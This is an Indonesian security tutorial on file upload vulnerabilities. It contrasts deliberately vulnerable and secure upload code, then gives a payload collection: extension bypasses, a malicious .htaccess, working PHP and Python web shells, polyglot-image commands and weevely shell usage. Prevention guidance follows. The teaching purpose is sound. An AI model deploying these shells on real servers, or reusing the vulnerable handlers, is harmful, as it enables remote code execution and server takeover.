# Kerentanan Unggahan File (File Upload Vulnerability)

## Pengertian

Kerentanan unggahan file terjadi ketika aplikasi web mengizinkan pengguna mengunggah file tanpa validasi dan filter yang memadai. Hal ini memungkinkan penyerang mengunggah file berbahaya, seperti web shell, dan menjalankannya di server.

**Analogi:** Bayangkan sebuah kantor pos yang menerima paket tanpa memeriksa isinya. Jika seseorang mengirimkan paket berisi bahan berbahaya, kantor pos tersebut akan menyimpan dan mendistribusikannya tanpa menyadari bahayanya.

## Contoh Source Code yang Rentan File Upload

### 1. PHP - Upload Tanpa Validasi

**Kode Rentan:**
```php
<?php
// BAHAYA: Tidak ada validasi tipe file atau ekstensi
if (isset($_FILES['file'])) {
    $target_dir = "uploads/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);
    
    // Langsung pindahkan file tanpa validasi
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    echo "File uploaded successfully: " . $target_file;
}
?>

<form method="POST" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Upload">
</form>
```

**Kode Aman:**
```php
<?php
if (isset($_FILES['file'])) {
    $target_dir = "uploads/";
    
    // AMAN: Generate nama file acak
    $file_extension = pathinfo($_FILES["file"]["name"], PATHINFO_EXTENSION);
    $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
    
    // AMAN: Validasi ekstensi file (whitelist)
    if (!in_array(strtolower($file_extension), $allowed_extensions)) {
        die("File type not allowed");
    }
    
    // AMAN: Validasi MIME type
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime_type = finfo_file($finfo, $_FILES["file"]["tmp_name"]);
    $allowed_types = ['image/jpeg', 'image/png', 'image/gif'];
    
    if (!in_array($mime_type, $allowed_types)) {
        die("Invalid file type");
    }
    
    // AMAN: Validasi ukuran file (max 2MB)
    if ($_FILES["file"]["size"] > 2000000) {
        die("File too large");
    }
    
    // AMAN: Generate nama file acak
    $new_filename = uniqid() . '.' . $file_extension;
    $target_file = $target_dir . $new_filename;
    
    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);
    echo "File uploaded successfully: " . $target_file;
}
?>
```

### 2. Python (Flask) - Upload dengan Validasi Lemah

**Kode Rentan:**
```python
from flask import Flask, request, send_from_directory
import os

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file', 400
    
    file = request.files['file']
    
    # BAHAYA: Hanya mengandalkan Content-Type dari klien
    if file.content_type not in ['image/jpeg', 'image/png']:
        return 'Invalid file type', 400
    
    # BAHAYA: Menggunakan nama file asli dari klien
    filename = file.filename
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], filename))
    
    return f'File uploaded: {filename}'

@app.route('/uploads/<filename>')
def uploaded_file(filename):
    return send_from_directory(app.config['UPLOAD_FOLDER'], filename)

if __name__ == "__main__":
    app.run(debug=True)
```

**Kode Aman:**
```python
from flask import Flask, request, send_from_directory
import os
import uuid
from werkzeug.utils import secure_filename

app = Flask(__name__)
UPLOAD_FOLDER = 'uploads'
app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
ALLOWED_EXTENSIONS = {'txt', 'pdf', 'png', 'jpg', 'jpeg', 'gif'}

def allowed_file(filename):
    return '.' in filename and \
           filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS

@app.route('/upload', methods=['POST'])
def upload_file():
    if 'file' not in request.files:
        return 'No file', 400
    
    file = request.files['file']
    
    if file.filename == '':
        return 'No file selected', 400
    
    # AMAN: Validasi ekstensi file
    if not allowed_file(file.filename):
        return 'File type not allowed', 400
    
    # AMAN: Validasi ukuran file (max 2MB)
    file.seek(0, os.SEEK_END)
    file_length = file.tell()
    if file_length > 2 * 1024 * 1024:
        return 'File too large', 400
    file.seek(0)
    
    # AMAN: Generate nama file acak
    ext = file.filename.rsplit('.', 1)[1].lower()
    new_filename = str(uuid.uuid4()) + '.' + ext
    
    file.save(os.path.join(app.config['UPLOAD_FOLDER'], new_filename))
    return f'File uploaded: {new_filename}'

if __name__ == "__main__":
    app.run(debug=True)
```

### 3. Node.js (Express) - Upload dengan Multer

**Kode Rentan:**
```javascript
const express = require('express');
const multer = require('multer');
const path = require('path');
const app = express();

// BAHAYA: Tidak ada filter file, semua tipe file diterima
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/')
    },
    filename: function (req, file, cb) {
        // BAHAYA: Menggunakan nama file asli
        cb(null, file.originalname)
    }
});

const upload = multer({ storage: storage });

app.post('/upload', upload.single('file'), (req, res) => {
    res.send('File uploaded: ' + req.file.filename);
});

app.listen(3000);
```

**Kode Aman:**
```javascript
const express = require('express');
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const app = express();

// AMAN: Filter file berdasarkan ekstensi
function fileFilter(req, file, cb) {
    const allowedTypes = /jpeg|jpg|png|gif/;
    const extname = allowedTypes.test(path.extname(file.originalname).toLowerCase());
    const mimetype = allowedTypes.test(file.mimetype);
    
    if (mimetype && extname) {
        return cb(null, true);
    } else {
        cb(new Error('Only image files are allowed'));
    }
}

// AMAN: Generate nama file acak
const storage = multer.diskStorage({
    destination: function (req, file, cb) {
        cb(null, 'uploads/')
    },
    filename: function (req, file, cb) {
        // AMAN: Nama file acak
        const randomName = crypto.randomBytes(16).toString('hex') + 
                          path.extname(file.originalname);
        cb(null, randomName)
    }
});

const upload = multer({ 
    storage: storage,
    fileFilter: fileFilter,
    limits: {
        fileSize: 2 * 1024 * 1024 // Max 2MB
    }
});

app.post('/upload', upload.single('file'), (req, res) => {
    res.send('File uploaded: ' + req.file.filename);
});

app.listen(3000);
```

## Mekanisme Kerentanan

Unggahan file menjadi rentan ketika sistem tidak melakukan hal-hal berikut:

- Memverifikasi tipe atau ekstensi file dengan benar
- Menyimpan file di direktori yang tidak dapat diakses secara publik
- Mencegah eksekusi file yang diunggah

Jika proses unggah file tidak dikontrol dengan ketat, file berbahaya dapat dieksekusi dan menyebabkan eksekusi kode jarak jauh (Remote Code Execution/RCE) atau pengambilalihan server.

## Dampak

Kerentanan ini dapat mengakibatkan:

- **Eksekusi Kode Jarak Jauh (RCE)** -- Penyerang dapat menjalankan perintah arbitrer di server
- **Pengambilalihan Sistem** -- Server dapat dikendalikan oleh penyerang
- **Penyebaran Malware** -- File berbahaya dapat digunakan sebagai backdoor
- **Akses ke File Sensitif** -- Penyerang dapat membaca file internal dan informasi rahasia

## Skenario Serangan Umum

### 1. Unggahan Web Shell
Penyerang mengunggah file berisi kode berbahaya (misalnya: `shell.php`) lalu mengaksesnya melalui URL untuk mengeksekusi perintah di server.

### 2. Manipulasi Nama File
Penyerang menggunakan nama file yang mengecoh sistem validasi, seperti:
- `shell.php.jpg` (ekstensi ganda)
- `shell.pHp` (variasi huruf kapital)
- `shell.php5` (ekstensi alternatif)

### 3. Pemalsuan Content-Type
Penyerang mengirim file `.php` tetapi mengatur header Content-Type menjadi `image/jpeg` agar terlihat seperti file gambar yang aman.

### 4. Eksploitasi File .htaccess
Pada server Apache, penyerang dapat mengunggah file `.htaccess` untuk memaksa server memproses file yang seharusnya tidak dieksekusi sebagai skrip.

### 5. Penyisipan Kode Berbahaya dalam File Dokumen
Penyerang menanamkan skrip berbahaya dalam file PDF, SVG, atau dokumen lainnya yang dapat diproses oleh server.

## Kumpulan Payload File Upload

### Payload Bypass Ekstensi

**Ekstensi ganda:**
```
shell.php.jpg
shell.php.png
shell.php.gif
shell.php%00.jpg (null byte injection)
```

**Variasi huruf kapital:**
```
shell.Php
shell.pHp
shell.PHP
shell.PhP
```

**Ekstensi alternatif:**
```
shell.php5
shell.php7
shell.phtml
shell.phar
shell.asp
shell.aspx
shell.jsp
shell.cgi
```

**Spasi dan titik di akhir:**
```
shell.php.
shell.php 
shell.php....
```

### Payload Content-Type Spoofing

**Mengubah Content-Type header:**
```
File: shell.php
Content-Type: image/jpeg

File: shell.php
Content-Type: image/png

File: shell.php
Content-Type: application/octet-stream
```

### Payload .htaccess Exploit

**File .htaccess berbahaya:**
```apache
# Memaksa server memproses file .jpg sebagai PHP
AddType application/x-httpd-php .jpg

# Atau ekstensi lain
AddType application/x-httpd-php .png
AddType application/x-httpd-php .gif
```

**Upload dan akses:**
```
1. Upload file .htaccess dengan konten di atas
2. Upload shell.php dengan nama shell.jpg
3. Akses http://target/uploads/shell.jpg
4. File akan dieksekusi sebagai PHP
```

### Payload Web Shell

**PHP Web Shell (sederhana):**
```php
<?php
// Command execution shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
```

**PHP Web Shell (advanced):**
```php
<?php
// File manager shell
echo "<form method='post' enctype='multipart/form-data'>";
echo "<input type='file' name='file'>";
echo "<input type='submit' value='Upload'>";
echo "</form>";

if($_FILES['file']){
    move_uploaded_file($_FILES['file']['tmp_name'], $_FILES['file']['name']);
    echo "File uploaded";
}

if(isset($_GET['cmd'])){
    echo "<pre>" . shell_exec($_GET['cmd']) . "</pre>";
}
?>
```

**Python CGI Shell:**
```python
#!/usr/bin/env python
import cgi, os

print("Content-Type: text/html")
print()

form = cgi.FieldStorage()
cmd = form.getvalue('cmd', '')

if cmd:
    print("<pre>")
    print(os.popen(cmd).read())
    print("</pre>")
```

### Payload Polyglot File

**File gambar yang mengandung PHP:**
```bash
# Membuat file JPG yang mengandung PHP code
echo "<?php system($_GET['cmd']); ?>" >> shell.php
cat image.jpg >> shell.php
mv shell.php shell.php.jpg
```

**GIF89a Header Bypass:**
```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

File ini akan terdeteksi sebagai GIF oleh validator MIME type, tetapi tetap dapat dieksekusi sebagai PHP.

## Tools untuk Pengujian File Upload

### 1. Burp Suite

Burp Suite dapat digunakan untuk manipulasi file upload:

- **Intruder** -- Menguji berbagai ekstensi dan Content-Type
- **Repeater** -- Memodifikasi request upload dan menganalisis respons
- **Extension: Turbo Intruder** -- Untuk pengujian otomatis yang lebih cepat

**Contoh penggunaan Intruder:**
```
1. Intercept request upload
2. Send to Intruder
3. Set payload position di filename
4. Load list ekstensi berbahaya
5. Analisis respons untuk setiap payload
```

### 2. ExifTool

ExifTool dapat digunakan untuk menyisipkan kode berbahaya ke dalam metadata file gambar.

**Instalasi:**
```bash
sudo apt install exiftool
```

**Penggunaan:**
```bash
-- Menyisipkan PHP code ke metadata gambar
exiftool -Comment="<?php system($_GET['cmd']); ?>" image.jpg

-- Verifikasi
exiftool image.jpg
```

### 3. Polyglot File Generator

Membuat file yang valid sebagai gambar dan mengandung kode berbahaya.

**Membuat PNG dengan PHP payload:**
```bash
# Buat file PNG yang mengandung PHP code
(echo -ne "\x89\x50\x4e\x47\x0d\x0a\x1a\x0a"; echo "<?php system(\$_GET['cmd']); ?>") > shell.png
```

### 4. Nmap

Nmap dapat digunakan untuk memindai direktori uploads yang dapat diakses publik.

**Penggunaan:**
```bash
-- Scan direktori uploads
nmap --script http-enum target.com

-- Menggunakan dirb atau gobuster
gobuster dir -u http://target.com/uploads -w /usr/share/wordlists/dirb/common.txt
```

### 5. PayloadsAllTheThings

Repositori lengkap berisi payload File Upload:
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload

### 6. weevely

weevely adalah web shell generator untuk PHP.

**Instalasi:**
```bash
git clone https://github.com/epinna/weevely3.git
cd weevely3
pip install -r requirements.txt
```

**Penggunaan:**
```bash
-- Generate web shell
python weevely.py generate password123 shell.php

-- Connect ke web shell
python weevely.py http://target.com/uploads/shell.php password123
```

## Metode Deteksi

Untuk mengidentifikasi apakah sebuah aplikasi rentan File Upload:

1. **Uji upload file berbahaya** -- Coba upload file `.php`, `.jsp`, `.asp`
2. **Uji bypass ekstensi** -- Gunakan ekstensi ganda atau variasi huruf kapital
3. **Uji Content-Type spoofing** -- Upload file `.php` dengan Content-Type `image/jpeg`
4. **Periksa direktori uploads** -- Lihat apakah file dapat diakses dan dieksekusi
5. **Uji .htaccess upload** -- Coba upload file `.htaccess` untuk mengubah konfigurasi server

## Metode Pencegahan

1. **Validasi ekstensi file** -- Gunakan whitelist ekstensi yang diizinkan (misalnya: `.jpg`, `.png`, `.pdf`). Jangan gunakan blacklist karena dapat dilewati
   
   ```php
   $allowed_extensions = ['jpg', 'jpeg', 'png', 'gif'];
   $file_extension = pathinfo($filename, PATHINFO_EXTENSION);
   
   if (!in_array(strtolower($file_extension), $allowed_extensions)) {
       die("File type not allowed");
   }
   ```

2. **Verifikasi Content-Type** -- Periksa tipe file di sisi server, bukan hanya dari header yang dikirim klien
   
   ```php
   $finfo = finfo_open(FILEINFO_MIME_TYPE);
   $mime_type = finfo_file($finfo, $_FILES["file"]["tmp_name"]);
   ```

3. **Ubah nama file saat penyimpanan** -- Generate nama file acak saat menyimpan untuk menghindari eksploitasi nama file
   
   ```python
   new_filename = uuid.uuid4().hex + '.' + file_extension
   ```

4. **Simpan di luar direktori publik** -- Simpan file unggahan di direktori yang tidak dapat diakses langsung melalui URL
   
   ```
   /var/www/app/
   ├── public/
   │   └── index.php
   └── uploads/          # Tidak dapat diakses via URL
       └── file.jpg
   ```

5. **Nonaktifkan eksekusi skrip** -- Konfigurasi server untuk tidak mengeksekusi file skrip di direktori unggahan
   
   **Apache (.htaccess):**
   ```apache
   <Directory "/uploads">
       php_flag engine off
       RemoveHandler .php .phtml .php3 .php4 .php5
       RemoveType .php .phtml .php3 .php4 .php5
   </Directory>
   ```
   
   **Nginx:**
   ```nginx
   location /uploads/ {
       location ~ \.php$ {
           deny all;
       }
   }
   ```

6. **Batasi ukuran file** -- Tetapkan batas maksimum ukuran file untuk mencegah serangan denial-of-service
   
   ```php
   if ($_FILES["file"]["size"] > 2000000) {
       die("File too large");
   }
   ```

7. **Gunakan antivirus scanning** -- Pindai file unggahan dengan antivirus untuk mendeteksi malware

## Latihan Praktis

Silakan lanjutkan ke direktori `Challange/` untuk latihan berbasis skenario.

## Referensi Lanjutan

- OWASP File Upload Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html
- PayloadsAllTheThings -- File Upload: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Upload
- CWE-434: Unrestricted Upload of File with Dangerous Type
- PortSwigger: File Upload Vulnerabilities -- https://portswigger.net/web-security/file-upload
- weevely -- https://github.com/epinna/weevely3
